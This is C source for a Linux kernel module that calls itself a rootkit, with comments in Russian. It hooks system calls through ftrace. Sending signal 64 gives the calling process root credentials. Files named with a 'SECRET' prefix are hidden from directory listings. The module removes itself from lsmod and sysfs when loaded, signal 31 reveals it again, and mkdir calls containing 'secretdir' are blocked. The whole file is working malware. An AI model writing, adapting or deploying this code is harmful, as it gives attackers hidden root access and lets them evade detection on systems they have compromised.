// ИСХОДНЫЙ КОД ОСНОВНОЙ МОДУЛЬ 
#include <linux/init.h> // макросы __init, __exit
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>  // asmlinkage, pt_regs (структура регистров) 
#include <linux/uaccess.h> // copy_from_user, copy_to_user, strncpy_from_user
#include <linux/cred.h> // struct cred
#include <linux/uidgid.h>
#include <linux/slab.h> // kmalloc, kfree (динамическое выделение памяти в ядре)
#include <linux/dirent.h> // struct linux_dirent64
#include <linux/list.h>
#include <linux/kobject.h>
#include "ftrace_helper.h"

#define SECRET "SECRET"   // префикс для скрытия 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("DanVol");
MODULE_DESCRIPTION("Rootkit");
// стек
static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

static struct cred *(*my_prepare_creds)(void);
static void (*my_commit_creds)(struct cred *);

static struct list_head *module_list_prev;
static struct kobject *module_kobj_parent;

static asmlinkage long hook_mkdir(const struct pt_regs *regs) {
    char __user *pathname = (char __user *)regs->di; // нам нужен 1 регистр с __user
    char buf[256]; // не обязательно, но для безопасности лучше выделить
    long err;

    err = strncpy_from_user(buf, pathname, sizeof(buf) - 1); // копирование ввода с пользовательского окружения 
    if (err > 0) {
        buf[err] = 0;
        if (strstr(buf, "secretdir")) {
            printk(KERN_INFO "rootkit: blocked mkdir %s\n", buf);
            return -EPERM;
        }
    }
    return orig_mkdir(regs); //  возрващаем оригинал если не подходит
}

static asmlinkage long hook_kill(const struct pt_regs *regs);
static asmlinkage long hook_getdents64(const struct pt_regs *regs);
// массив хуков (/proc/kallsyms)
static struct ftrace_hook hooks[] = {
    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
};

static asmlinkage long hook_kill(const struct pt_regs *regs) {
    int sig = (int)regs->si;

    if (sig == 64) {
        printk(KERN_INFO "rootkit: signal 64 received\n");
        if (my_prepare_creds && my_commit_creds) {  // нашлись ли символы в ядре 
            struct cred *new = my_prepare_creds();
            if (new) {
                new->uid = new->euid = new->suid = new->fsuid = GLOBAL_ROOT_UID; // вне зависимости от дистрибутива универсальное изменение UID и GID 
                new->gid = new->egid = new->sgid = new->fsgid = GLOBAL_ROOT_GID;
                my_commit_creds(new);
                printk(KERN_INFO "rootkit: root taken\n");
                return 0;
            } 
            else {
                printk(KERN_ERR "rootkit: prepare_creds failed\n");
            }
        } 
        else {
            printk(KERN_ERR "rootkit: prepare_creds/commit_creds not found\n");
        }
        return -EPERM;
    }
    else if (sig == 31) {
        printk(KERN_INFO "rootkit: signal 31 received, revealing module\n");
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
        // Восстанавление в глобальный список модулей
        if (module_list_prev) {
            list_add(&THIS_MODULE->list, module_list_prev);
        }
        // sysfs
        if (module_kobj_parent) {
            kobject_add(&THIS_MODULE->mkobj.kobj, module_kobj_parent, THIS_MODULE->name);
        }
        printk(KERN_INFO "rootkit: module is now visible\n");
        return 0;
    }
    return orig_kill(regs);
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    if (ret <= 0) return ret;

    unsigned int fd = (unsigned int)regs->di;
    struct linux_dirent64 __user *dirp = (struct linux_dirent64 __user *)regs->si;
    unsigned int count = (unsigned int)regs->dx;
    char *buf = kmalloc(ret, GFP_KERNEL); // динамическое выделение 
    if (!buf) return ret;

    if (copy_from_user(buf, dirp, ret)) {
        kfree(buf);
        return ret;
    }

    char *ptr = buf;
    char *end = buf + ret;
    // передвижение указателя по названию
    while (ptr < end) {
        struct linux_dirent64 *entry = (struct linux_dirent64 *)ptr;
        if (strncmp(entry->d_name, SECRET, strlen(SECRET)) == 0) {
            unsigned short reclen = entry->d_reclen;
            memmove(ptr, ptr + reclen, end - (ptr + reclen));
            ret -= reclen;
            end -= reclen;
        } 
        else {
            ptr += entry->d_reclen;
        }
    }

    if (copy_to_user(dirp, buf, ret)) {
        kfree(buf);
        return -EFAULT;
    }
    kfree(buf);
    return ret;
}

static int __init rootkit_init(void) {
    int ret;
    // ftrace_helper.h
    my_prepare_creds = (void *)lookup_name("prepare_creds");
    my_commit_creds  = (void *)lookup_name("commit_creds");

    if (!my_prepare_creds || !my_commit_creds) {
        printk(KERN_ERR "rootkit: cant find prepare_creds or commit_creds\n");
        return -ENOENT;
    }
    // ftrace_helper.h
    ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret) {
        printk(KERN_ERR "rootkit: failed to install hooks\n");
        return ret;
    }
    module_list_prev = THIS_MODULE->list.prev;
    module_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
    printk(KERN_INFO "rootkit: loaded\n");
    list_del_init(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    printk(KERN_INFO "rootkit: module hidden from lsmod and sysfs\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    // ftrace_helper.h
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
